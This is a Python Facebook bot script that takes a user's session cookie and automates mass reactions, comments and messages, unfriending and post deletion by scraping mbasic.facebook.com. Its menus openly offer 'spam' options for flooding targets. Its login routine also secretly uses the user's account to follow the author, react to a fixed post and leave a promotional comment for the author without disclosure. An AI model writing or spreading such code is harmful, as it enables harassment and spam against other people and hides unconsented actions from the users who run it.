#mau ngapain? recode doang ga ngasih bintang ampass!
import os,sys,time,requests,re,random
from time import sleep
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor
"""
Project : bot facebook
author : fahmiapz
di update pada : 28 november 2021
"""
b="\033[94m"
c="\033[96m"
g="\033[92m"
r="\033[91m"
p="\033[1;97m"
d="\033[00m"
ab="\033[90m"
dn=f"{d}[{g}√{d}]{p}"
er=f"{d}[{r}!{d}]{p}"
pr=f"{d}[{c}*{d}]{p}"
id_react=[]
id_komen=[]
id_post=[]
id_teman=[]
id_req=[]
id_msg=[]
id_search=[]
done=0
die=0
mbasic="https://mbasic.facebook.com{}"
#####################awalan#######################
def clear():
    os.system("cls" if os.name == "nt" else "clear")

def baner():
    clear()
    print(f"""
     {d}╔╗ ┌─┐┌┬┐ {b}╔═╗┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─
     {d}╠╩╗│ │ │  {b}╠╣ ├─┤│  ├┤ ├┴┐│ ││ │├┴┐
     {d}╚═╝└─┘ ┴  {b}╚  ┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴
{ab}-----------------------------------------------
{d}Donate   : {g}https://saweria.co/FahmiDevs
{d}Message  : {g}https://wa.me/62881024612817
{d}Restapi  : {g}https://ainxbot-id.herokuapp.com
{d}Youtube  : {g}https://youtube.com/KuhakuTermux
{d}Github   : {g}https://github.com/Ainx-BOT
{d}Facebook : {g}https://facebook.com/kang.ngeue.313
{ab}-----------------------------------------------{d}""")

def cblg():
    lg=input(f"{pr}Coba lagi? ({d}{c}y{d}/{c}n{p}) : {c}")
    if lg == "y" or lg == "Y":
       os.system("python run.py")
    elif lg == "n" or lg == "N":
       sys.exit(f"{er}Bye bro jangan lupa kasih bintang github saya:)")
    else:
       print(f"{er}Ngetik yang bener coeg")
       cblg()

def process(success,failed):
    for i in list("\|/-•"):
        print(f"\r{d}[{c}{i}{d}]{p}Success : {g}{success} {p}Failed : {r}{failed}",end="",flush=True)
        sleep(0.2)
###################login###############################
def ug():
    try:
        ua=open("useragent").read()
    except FileNotFoundError:
        ua=input(f"{pr}Useragent : {c}")
    with open("useragent","w") as u:
         u.write(ua)
    return ua
def login():
    try:
        cokie=open("cookies").read()
    except FileNotFoundError:
        cokie=input(f"{pr}Cookies : {c}")
    cokie={"cookie":cokie}
    log=ses.get(mbasic.format("/me"),cookies=cokie).text
    if "mbasic_logout_button" in log:
       if "Apa yang Anda pikirkan sekarang" in log:
           with open("cookies","w") as ex:
               ex.write(cokie["cookie"])
       else:
           try:
              ses.get(bs(mbasic.format(log,"html.parser").find('a',string='Bahasa Indonesia')["href"],cookies=cokie))
           except:
              pass
       try:
           flw=ses.get(mbasic.format("/kang.ngeue.313"),cookies=cokie).text
           flw=bs(flw,"html.parser").find('a',string='Ikuti')['href']
           ses.get(mbasic.format(flw),cookies=cokie)
       except:
           pass
       try:
           req=ses.get("https://mbasic.facebook.com/100056934954432/posts/378286937412468/",cookies=cokie).text
           react=bs(req,"html.parser").find("a",href=lambda x: "/reactions/picker/" in x)["href"]
           react=ses.get(mbasic.format(react),cookies=cokie).text
           love=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=2&" in x)["href"]
           care=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=16&" in x)["href"]
           wow=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=3&" in x)["href"]
           angry=bs(react,"html.parser").find("a",href=lambda x: "&reaction_type=8&" in x)["href"]
           ty=[angry,love,care,wow]
           type=random.choice(ty)
           ses.get(mbasic.format(type),cookies=cokie)
       except:
           pass
       try:
           req=ses.get("https://mbasic.facebook.com/100056934954432/posts/378286937412468/",cookies=cokie).text
           komen=bs(req,"html.parser").find("form",action=lambda x: "comment.php" in x)
           data=komen.find_all("input",type="hidden")
           fbdtsg=data[0]["value"]
           jazoest=data[1]["value"]
           text=["Hi bang fahmi tools nya keren banget!","tools nya sangat berguna!","Hi i'm user tools Ainx-BOT","semoga rejeki bang fahmi di lancarin amin","tools yang sangat bagus!"]
           random_komen=random.choice(text)
           ses.post(mbasic.format(komen["action"]),data={"fb_dtsg":fbdtsg,"jazoest":jazoest,"comment_text":random_komen},cookies=cokie)
       except:
           pass
       return cokie["cookie"]
    else:
       print(f"{er}Cookies Invalid")
       sleep(2)
       os.system("rm cookies")
       os.system("python run.py")

def userinfo():
    user=ses.get(mbasic.format("/me"),cookies=cokie).text
    name=bs(user,"html.parser").find("title").text
    try:
        id = bs(user,"html.parser").find("a", href = lambda x:"/allactivity" in x)["href"]
        id = re.search(r"/\d+/?", id).group().replace("/", "")
    except TypeError:
        id=None
    print(f"{d}Login as : {c}{name}")
    print(f"{d}ID       : {c}{id}")
    print(f"{ab}-----------------------------------------------{d}")
##################dump########################
def react(url,type):
    req=ses.get(mbasic.format(url),cookies=cokie).text
    if "Tanggapi" in req:
       rc=bs(req,"html.parser").find_all("a",string="Tanggapi")
    else:
       rc=bs(req,"html.parser").find_all("a",href=lambda x: "/reactions/picker/?" in x)
    for x in rc:
        id_react.append(x["href"])
        print(f"\r{pr}Getting Data : {c}{len(id_react)}",end="")
    if type in req:
        next=bs(req,"html.parser").find("a",string=type)["href"]
        if len(id_react) > 200:
            return id_react[:200]
        else:
            react(next,type)
    return id_react

def komen(url,type):
    req=ses.get(url,cookies=cokie).text
    kmn=bs(req,"html.parser").find_all("a",string="Berita Lengkap")
    for x in kmn:
        id_komen.append(x["href"])
        print(f"\r{pr}Getting Data : {c}{len(id_komen)}",end="")
    if type in req:
        next=bs(req,"html.parser").find("a",string=type)["href"]
        if len(id_komen) > 200:
            return id_komen[:200]
        else:
            komen(mbasic.format(next),type)
    return id_komen
def teman(url):
    req=ses.get(url,cookies=cokie).text
    tmn=re.findall(r'middle"><a class=".." href="(.*?)">',req)
    for x in tmn:
        id_teman.append(x)
        print(f"\r{pr}Getting Data : {c}{len(id_teman)}",end="")
    if "Lihat Teman Lain" in req:
        next=bs(req,"html.parser").find("a",string="Lihat Teman Lain")["href"]
        teman(mbasic.format(next))
    return id_teman

def reqall(url,type):
    req=ses.get(url,cookies=cokie).text
    res=bs(req,"html.parser").find_all("a",string=type)
    for x in res:
        id_req.append(x["href"])
        print(f"\r{pr}Getting Data : {c}{len(id_req)}",end="")
    if "Lihat selengkapnya" in req:
        next=bs(req,"html.parser").find("a",string="Lihat selengkapnya")["href"]
        reqall(mbasic.format(next),type)
    return id_req

def msg(url,text):
    global done,die
    req=ses.get(url,cookies=cokie).text
    nama=bs(req,"html.parser").find("title").text
    snd=bs(req,"html.parser").find("a",href=lambda x: "/messages/thread/" in x)
    snd=ses.get(mbasic.format(snd["href"]),cookies=cokie).text
    krm=bs(snd,"html.parser").find("form",action=lambda x: "/messages/send/?icm=1" in x)
    data=krm.find_all("input",type="hidden")
    if not "&refid=" in krm["action"]:
       fbdtsg=data[0]["value"]
       jazoest=data[1]["value"]
       ids=data[2]["value"]
       tids=data[3]["value"]
       param={"fb_dtsg":fbdtsg,"jazoest":jazoest,"ids["+ids+"]":ids,"text_ids["+ids+"]":tids,"body":text,"Send":"Kirim"}
    else:
       fbdtsg=data[0]["value"]
       jazoest=data[1]["value"]
       tids=data[2]["value"]
       wup=data[3]["value"]
       ids=data[4]["value"]
       cv=data[7]["value"]
       cs=data[8]["value"]
       param={"fb_dtsg":fbdtsg,"jazoest":jazoest,"body":text,"send":"Kirim","tids":tids,"wwwupp":wup,"ids["+ids+"]":ids,"referrer":"","ctype":"","cver":cv,"csid":cs}
    psn=ses.post(mbasic.format(krm["action"]),data=param,cookies=cokie).text
    if text in psn:
       print(f"\r{dn}Message send to {c}{nama}")
       done+=1
    else:
       die+=1
    process(done,die)
def onteman(url):
    req=ses.get(url,cookies=cokie).text
    on=bs(req,"html.parser").find_all("a",href=lambda x: x and "/messages/read/?fbid=" in x)
    for x in on:
        id_teman.append(re.findall(r'=(\d*)',x["href"])[0])
    return id_teman
def main_react(url,type):
    global done,die
    req=ses.get(url,cookies=cokie).text
    ty=bs(req,"html.parser").find("a",href=lambda x: type in x)
    res=ses.get(mbasic.format(ty["href"]),cookies=cokie).text
    if ty.text in res:
       nama=bs(res,"html.parser").find("title").text
       done+=1
    else:
       die+=1
    process(done,die)
def main_comment(url,text):
    global done,die
    req=ses.get(url,cookies=cokie).text
    kmn=bs(req,"html.parser").find("form",action=lambda x: "comment.php" in x)
    url_komen=mbasic.format(kmn['action'])
    data=kmn.find_all("input",type="hidden")
    fbdtsg=data[0]["value"]
    jazoest=data[1]["value"]
    params={"fb_dtsg":fbdtsg,"jazoest":jazoest,"comment_text":text}
    res=ses.post(url_komen,data=params,cookies=cokie).text
    if text in res:
       done+=1
    else:
       die+=1
    process(done,die)

def getmes(url):
   req=ses.get(url,cookies=cokie).text
   dlt=bs(req,"html.parser").find_all("a",href=lambda x: "/messages/read/" in x)
   for x in dlt:
       id_msg.append(x["href"])
       print(f"\r{pr}Getting Data : {c}{len(id_msg)}",end="")
   if "Lihat Pesan Sebelumnya" in req:
       next=bs(req,"html.parser").find("a",string="Lihat Pesan Sebelumnya")["href"]
       getmes(mbasic.format(next))
   return id_msg
def delmes(url):
    global done,die
    try:
        req=ses.get(url,cookies=cokie).text
        dlt=bs(req,"html.parser").find("form",action=lambda x: "/messages/action_redirect?" in x)
        data=dlt.find_all("input",type="hidden")
        fbdtsg=data[0]["value"]
        jazoest=data[1]["value"]
        last=ses.post(mbasic.format(dlt["action"]),data={"fb_dtsg":fbdtsg,"jazoest":jazoest,"delete":"Hapus"},cookies=cokie).text
        last=bs(last,"html.parser").find("a",string="Hapus")["href"]
        ses.get(mbasic.format(last),cookies=cokie)
        done+=1
    except:
        die+=1
    process(done,die)
def unaccrej(url,type):
    global done,die
    req=ses.get(url,cookies=cokie).text
    if type in req:
       done+=1
    else:
       die+=1
    process(done,die)
def unf(url):
    global done,die
    req=ses.get(url,cookies=cokie).text
    nama=bs(req,"html.parser").find("title").text
    hps=bs(req,"html.parser").find("a",string="Batalkan pertemanan")["href"]
    hps=ses.get(mbasic.format(hps),cookies=cokie).text
    hps=bs(hps,"html.parser").find("form",action=lambda x: "/a/friends/remove/?" in x)
    data=hps.find_all("input",type="hidden")
    fbdtsg=data[0]["value"]
    jazoest=data[1]["value"]
    res=ses.post(mbasic.format(hps["action"]),data={"fb_dtsg":fbdtsg,"jazoest":jazoest,"confirm":"Konfirmasi"},cookies=cokie).text
    if "Anda tidak lagi berteman dengan" in res:
       print(f"\r{dn}Si {nama}{p}{g} success {p}di unfriend")
       done+=1
    else:
       die+=1
    process(done,die)
def mypost(url):
    req=ses.get(url,cookies=cokie).text
    dlt=bs(req,"html.parser").find_all("a",string="Lainnya")
    for x in dlt:
        id_post.append(x["href"])
        print(f"\r{pr}Getting Data : {c}{len(id_post)}",end="")
    if "Lihat Berita Lain" in req:
        next=bs(req,"html.parser").find("a",string="Lihat Berita Lain")["href"]
        mypost(mbasic.format(next))
    return id_post
def delpost(url):
    global done,die
    try:
        req=ses.get(url,cookies=cokie).text
        dlt=bs(req,"html.parser").find("form",action=lambda x: "/nfx/basic/handle_action/?" in x)
        url_dlt=mbasic.format(dlt["action"])
        data=dlt.find_all("input",type="hidden")
        fbdtsg=data[0]["value"]
        jazoest=data[1]["value"]
        params={"fb_dtsg":fbdtsg,"jazoest":jazoest,"action_key":"DELETE","submit":"Kirim"}
        ses.post(url_dlt,data=params,cookies=cokie)
        done+=1
    except:
        die+=1
    process(done,die)
def find(url):
    req=ses.get(url,cookies=cokie).text
    people=re.findall(r'</a></td><td class=".. .."><a href="(.*?)"><div class=".."><div class="..">(.*?)</div></div>',req)
    for x in people:
        if "profile" in x[0]:
           id_search.append(re.findall(r'=(\d*)',x[0])[0]+"|"+x[1])
        else:
           id_search.append(x[0].split("?")[0].replace("/","")+"|"+x[1])
        print(f"\r{pr}Getting Data : {c}{len(id_search)}",end="")
    if "Lihat Hasil Selanjutnya" in req:
        next=bs(req,"html.parser").find("a",string="Lihat Hasil Selanjutnya")["href"]
        find(next)
    return id_search
##################Menu##############################
def menu():
    baner()
    userinfo()
    print(f"""{p} 
{c}01{ab}. {p}spam react
{c}02{ab}. {p}spam comment
{c}03{ab}. {p}spam message
{c}04{ab}. {p}auto delete message
{c}05{ab}. {p}auto accept request friend
{c}06{ab}. {p}auto reject request friend
{c}07{ab}. {p}auto unadd not unfriend
{c}08{ab}. {p}auto unfriend
{c}09{ab}. {p}auto delete post
{c}10{ab}. {p}find people
{c}00{ab}. {p}exit
{ab}-----------------------------------------------{d}""")
    pilih_menu_home()
def spam_react():
    baner()
    userinfo()
    print(f"""{p} 
{c}01{ab}. {p}spam react in people
{c}02{ab}. {p}spam react in home
{c}03{ab}. {p}spam react in group
{c}00{ab}. {p}back
{ab}-----------------------------------------------""")
    pilih_menu_react()
def spam_comment():
    baner()
    userinfo()
    print(f"""{p} 
{c}01{ab}. {p}spam comment in people
{c}02{ab}. {p}spam comment in home
{c}03{ab}. {p}spam comment in group
{c}04{ab}. {p}spam comment in target post
{c}00{ab}. {p}back
{ab}-----------------------------------------------""")
    pilih_menu_comment()
def spam_message():
    baner()
    userinfo()
    print(f"""{p} 
{c}01{ab}. {p}spam message online friend
{c}02{ab}. {p}spam message target friend
{c}00{ab}. {p}back
{ab}-----------------------------------------------""")
    pilih_menu_message()
def pilih_menu_home():
    choice=input(f"{pr}Select : {c}")
    if choice == "00" or choice == "0":
       baner()
       sys.exit(f"{er}Bye bro jangan lupa kasih bintang github saya:)")
    elif choice == "01" or choice == "1":
       spam_react()
    elif choice == "02" or choice == "2":
       spam_comment()
    elif choice == "03" or choice == "3":
       spam_message()
    elif choice == "04" or choice == "4":
       usr=getmes(mbasic.format("/messages/"))
       if len(usr) <= 0:
          print(f"{er}Tidak ada pesan yg tersedia")
          cblg()
       print()
       try:
          with ThreadPoolExecutor(max_workers=10) as ex:
               for x in usr:
                   ex.submit(delmes,(mbasic.format(x)))
          print()
          cblg()
       except UnboundLocalError:
          pass
       except Exception as e:
          print()
          print(f"{er}{e}")
          cblg()
    elif choice == "05" or choice == "5":
       usr=reqall(mbasic.format("/friends/center/requests/#friends_center_main"),"Konfirmasi")
       print()
       try:
          jum=input(f"{pr}Accept Count : {c}")
          jum=int(jum)
       except ValueError:
          print(f"{er}Masukin jumlah yg mau di acceptnya coeg")
          jum=input(f"{pr}Accept Count : {c}")
          jum=int(jum)
       try:
          with ThreadPoolExecutor(max_workers=10) as ex:
               for x in usr[:jum]:
                   ex.submit(unaccrej,(mbasic.format(x)),("Permintaan diterima"))
          print()
          cblg()
       except UnboundLocalError:
          pass
       except Exception as e:
          print()
          print(f"{er}{e}")
          cblg()
    elif choice == "06" or choice == "6":
       usr=reqall(mbasic.format("/friends/center/requests/#friends_center_main"),"Hapus Permintaan")
       print()
       try:
          jum=input(f"{pr}Reject Count : {c}")
          jum=int(jum)
       except ValueError:
          print(f"{er}Masukin jumlah yg mau di rejectnya/hapusnya coeg")
          jum=input(f"{pr}Reject Count : {c}")
          jum=int(jum)
       try:
          with ThreadPoolExecutor(max_workers=10) as ex:
               for x in usr[:jum]:
                   ex.submit(unaccrej,(mbasic.format(x)),("Permintaan dihapus"))
          print()
          cblg()
       except UnboundLocalError:
          pass
       except Exception as e:
          print()
          print(f"{er}{e}")
          cblg()
    elif choice == "07" or choice == "7":
       usr=reqall(mbasic.format("/friends/center/requests/outgoing/#friends_center_main"),"Batalkan Permintaan")
       print()
       try:
          jum=input(f"{pr}Unadd Count : {c}")
          jum=int(jum)
       except ValueError:
          print(f"{er}Masukin jumlah yg mau di unadd nya coeg")
          jum=input("Unadd Count : {c}")
          jum=int(jum)
       try:
          with ThreadPoolExecutor(max_workers=10) as ex:
               for x in usr[:jum]:
                   ex.submit(unaccrej,(mbasic.format(x)),("Permintaan dibatalkan"))
          print()
          cblg()
       except UnboundLocalError:
          pass
       except Exception as e:
          print()
          print(f"{er}{e}")
          cblg()
    elif choice == "08" or choice == "8":
       req=ses.get(mbasic.format("/me"),cookies=cokie).text
       tmn=bs(req,"html.parser").find('a',string='Teman')["href"]
       usr=teman(mbasic.format(tmn))
       print()
       try:
          jum=input(f"{pr}Unfriend Count : {c}")
          jum=int(jum)
       except ValueError:
          print(f"{er}Masukin jumlah yang mau di unfriendnya coeg")
          jum=input(f"{pr}Unfriend Count : {c}")
          jum=int(jum)
       try:
          with ThreadPoolExecutor(max_workers=10) as ex:
               for x in usr[:jum]:
                   ex.submit(unf,(mbasic.format(x)))
          print()
          cblg()
       except UnboundLocalError:
          pass
       except Exception as e:
          print()
          print(f"{er}{e}")
          cblg()
    elif choice == "09" or choice == "9":
       usr=mypost(mbasic.format("/me?v=timeline"))
       print()
       try:
          jum=input(f"{pr}Delete Count : {c}")
          jum=int(jum)
       except ValueError:
          print(f"{er}Masukin jumlah post yg mau dihapusnya coeg")
          jum=input(f"{pr}Delete Count : {c}")
          jum=int(jum)
       try:
          with ThreadPoolExecutor(max_workers=10) as ex:
               for x in usr[:jum]:
                   ex.submit(delpost,(mbasic.format(x)))
          print()
          cblg()
       except UnboundLocalError:
          pass
       except Exception as e:
          print()
          print(f"{er}{e}")
          cblg()
    elif choice == "10":
       username=input(f"{pr}Find by name : {c}")
       usr=find(mbasic.format("/search/people/?q="+username+"&source=filter&isTrending=0"))
       print()
       for x in usr:
           x=x.split("|")
           print(f"{dn}{p}name : {c}{x[1]}")
           print(f"{dn}{p}Username/ID : {c}{x[0]}")
           print(f"{ab}-----------------------------------------------")
       print(f"{er}Please copy the username/id")
       input(f"{d}[ {c}Press Enter To Back {d}]")
       menu()
    else:
       print(f"{er}Wrong input")
       pilih_menu_home()
def pilih_menu_react():
    choice=input(f"{pr}Select : {c}")
    if choice == "00" or choice == "0":
       menu()
    elif choice == "01" or choice == "1":
       ty=react_type()
       username=input(f"{pr}Username/ID target : {c}")
       if username.isdigit():
          username="/profile.php?id="+username+"&v=timeline"
       else:
          username="/"+username+"?v=timeline"
       usr=react(username,"Lihat Berita Lain")
       print()
       try:
           jum=input(f"{pr}React Count : {c}")
           jum=int(jum)
       except ValueError:
           print(f"{er}Masukin jumlah post yg mau di reactnya coeg")
           jum=input(f"{pr}React Count : {c}")
           jum=int(jum)
       try:
           with ThreadPoolExecutor(max_workers=10) as ex:
                for x in usr[:jum]:
                    ex.submit(main_react,(mbasic.format(x)),(ty))
           print()
           cblg()
       except UnboundLocalError:
           pass
       except Exception as e:
           print()
           print(f"{er}{e}")
           cblg()
    elif choice == "02" or choice == "2":
       ty=react_type()
       usr=react("/home.php","Lihat Berita Lain")
       print()
       try:
           jum=input(f"{pr}React Count : {c}")
           jum=int(jum)
       except ValueError:
           print(f"{er}Masukin jumlah post yg mau di reactnya coeg")
           jum=input(f"{pr}React Count : {c}")
           jum=int(jum)
       try:
           with ThreadPoolExecutor(max_workers=10) as ex:
                for x in usr[:jum]:
                    ex.submit(main_react,(mbasic.format(x)),(ty))
           print()
           cblg()
       except UnboundLocalError:
           pass
       except Exception as e:
           print()
           print(f"{er}{e}")
           cblg()
    elif choice == "03" or choice == "3":
       ty=react_type()
       username=input(f"{pr}Username/ID Group : {c}")
       usr=react("/groups/"+username+"/","Lihat Postingan Lainnya")
       print()
       try:
           jum=input(f"{pr}React Count : {c}")
           jum=int(jum)
       except ValueError:
           print(f"{er}Masukin jumlah post yg mau di reactnya coeg")
           jum=input(f"{pr}React Count : {c}")
           jum=int(jum)
       try:
           with ThreadPoolExecutor(max_workers=10) as ex:
                for x in usr[:jum]:
                    ex.submit(main_react,(mbasic.format(x)),(ty))
           print()
           cblg()
       except UnboundLocalError:
          pass
       except Exception as e:
          print()
          print(f"{er}{e}")
          cblg()
    else:
       print(f"{er}Wrong Input")
       pilih_menu_react()
def react_type():
    baner()
    userinfo()
    print(f"""
{p}Reaction Type
{c}01{ab}. {p}like
{c}02{ab}. {p}love
{c}03{ab}. {p}care
{c}04{ab}. {p}haha
{c}05{ab}. {p}wow
{c}06{ab}. {p}sad
{c}07{ab}. {p}angry
{c}00{ab}. {p}back
{ab}-----------------------------------------------""")
    return rct()
def rct():
    choice=input(f"{pr}Select : {c}")
    if choice == "00" or choice == "0":
       spam_react()
    elif choice == "01" or choice == "1":
       return "&reaction_type=1&"
    elif choice == "02" or choice == "2":
       return "&reaction_type=2&"
    elif choice == "03" or choice == "3":
       return "&reaction_type=16&"
    elif choice == "04" or choice == "4":
       return "&reaction_type=4&"
    elif choice == "05" or choice == "5":
       return "&reaction_type=3&"
    elif choice == "06" or choice == "6":
       return "&reaction_type=7&"
    elif choice == "07" or choice == "7":
       return "&reaction_type=8&"
    else:
       print(f"{er}Pilih yg bener coeg")
       rct()
def pilih_menu_comment():
    choice=input(f"{pr}Select : {c}")
    if choice == "00" or choice == "0":
       menu()
    elif choice == "01" or choice == "1":
       username=input(f"{pr}Username/ID Target : {c}")
       if username.isdigit():
          username="/profile.php?id="+username+"&v=timeline"
       else:
          username="/"+username+"?v=timeline"
       usr=komen(mbasic.format(username),"Lihat Berita Lain")
       print()
       pesan=input(f"{pr}Comment here : {c}")
       try:
          jum=input(f"{pr}Comment Count : {c}")
          jum=int(jum)
       except ValueError:
          print(f"{er}Masukin jumlah post yg mau di commentnya coeg")
          jum=input(f"{pr}Comment Count : {c}")
          jum=int(jum)
       try:
          with ThreadPoolExecutor(max_workers=10) as ex:
               for x in usr[:jum]:
                   ex.submit(main_comment,(mbasic.format(x)),(pesan))
          print()
          cblg()
       except UnboundLocalError:
          pass
       except Exception as e:
          print()
          print(f"{er}{e}")
          cblg()
    elif choice == "02" or choice == "2":
       usr=komen(mbasic.format("/home.php"),"Lihat Berita Lain")
       print()
       pesan=input(f"{pr}Comment Here : {c}")
       try:
           jum=input(f"{pr}Comment Count : {c}")
           jum=int(jum)
       except ValueError:
           print(f"{er}Masukin jumlah post yg mau di comment nya coeg")
           jum=input(f"{pr}Comment Count : {c}")
           jum=int(jum)
       try:
           with ThreadPoolExecutor(max_workers=10) as ex:
                for x in usr[:jum]:
                    ex.submit(main_comment,(mbasic.format(x)),(pesan))
           print()
           cblg()
       except UnboundLocalError:
           pass
       except Exception as e:
           print()
           print(f"{er}{e}")
           cblg()
    elif choice == "03" or choice == "3":
       username=input(f"{pr}Username/ID Group : {c}")
       usr=komen(mbasic.format(username),"Lihat Postingan Lainnya")
       print()
       pesan=input(f"{pr}Comment Here : {c}")
       try:
          jum=input(f"{pr}Comment Count : {c}")
          jum=int(jum)
       except ValueError:
          print(f"{er}Masukin jumlah post yg mau di commentnya coeg")
          jum=input(f"{pr}Comment Count : {c}")
          jum=int(jum)
       try:
          with ThreadPoolExecutor(max_workers=30) as ex:
               for x in usr[:jum]:
                   ex.submit(main_comment,(mbasic.format(x)),(pesan))
          print()
          cblg()
       except UnboundLocalError:
          pass
       except Exception as e:
          print()
          print(f"{er}{e}")
          cblg()
    elif choice == "04" or choice == "4":
       username=input(f"{pr}UrlPost? : {c}")
       if "www.facebook" in username:
          username=username.replace("www.facebook","mbasic.facebook")
       elif "m.facebook" in username:
          username=username.replace("m.facebook","mbasic.facebook")
       else:
          username=username
       pesan=input(f"{pr}Comment Here : {c}")
       try:
          jum=input(f"{pr}Comment Count : {c}")
          jum=int(jum)
       except ValueError:
          print(f"{er}Masukin jumlah comment nya coeg")
          jum=input(f"{pr}Comment Count : {c}")
          jum=int(jum)
       try:
          with ThreadPoolExecutor(max_workers=10) as ex:
               for i in range(jum):
                   ex.submit(main_comment,(username),(pesan))
          print()
          cblg()
       except UnboundLocalError:
          pass
       except Exception as e:
          print()
          print(f"{er}{e}")
          cblg()
    else:
       print(f"{er}Wrong input")
       pilih_menu_comment()
def pilih_menu_message():
    choice=input(f"{pr}Select : {c}")
    if choice == "00" or choice == "0":
       menu()
    elif choice == "01" or choice == "1":
       usr=onteman(mbasic.format("/buddylist.php"))
       print()
       pesan=input(f"{pr}Message : {c}")
       try:
           jum=input(f"{pr}Send Count : {c}")
           jum=int(jum)
       except ValueError:
           print(f"{er}Masukin jumlah pesan yg mau dikirimnya coeg")
           jum=input(f"{pr}Send Count : {c}")
           jum=int(jum)
       try:
           with ThreadPoolExecutor(max_workers=10) as ex:
                for x in usr[:jum]:
                    ex.submit(msg,(mbasic.format("/profile.php?id="+x)),(pesan))
           print()
           cblg()
       except UnboundLocalError:
           pass
       except Exception as e:
           print()
           print(f"{er}{e}")
           cblg()
    elif choice == "02" or choice == "2":
       username=input(f"{pr}Username/ID target : {c}")
       if username.isdigit():
          username="/profile.php?id="+username
       else:
          username="/"+username
       url=mbasic.format(username)
       pesan=input(f"{pr}Message : {c}")
       try:
          jum=input(f"{pr}Send Count : {c}")
          jum=int(jum)
       except ValueError:
          print(f"{er}Masukin jumlah pesan yg mau dikirimnya coeg")
          jum=input(f"{pr}Send Count : {c}")
          jum=int(jum)
       try:
          with ThreadPoolExecutor(max_workers=10) as ex:
               for _ in range(jum):
                  ex.submit(msg,(url),(pesan))
          print()
          cblg()
       except UnboundLocalError:
          pass
       except Exception as e:
          print()
          print(f"{er}{e}")
          cblg()
    else:
       print(f"{er}Wrong Input")
       pilih_menu_message()
if __name__=="__main__":
    baner()
    ses=requests.Session()
    ua=ug()
    ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","referer":"https://mbasic.facebook.com/","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    try:
        ck=login()
        cokie={"cookie":ck}
        menu()
    except Exception as e:
        sys.exit(f"{er}{e}")
